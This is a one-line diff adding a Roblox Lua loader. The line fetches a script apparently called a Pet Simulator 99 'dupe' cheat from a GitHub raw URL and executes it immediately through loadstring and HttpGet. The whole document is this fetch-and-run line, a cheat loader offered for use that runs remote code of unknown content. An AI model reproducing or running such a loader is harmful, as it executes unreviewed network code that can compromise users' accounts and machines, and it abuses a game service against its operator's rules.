@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/superdogerider265/Ps99DupeScript/main/Ps99dupeScript", true))()
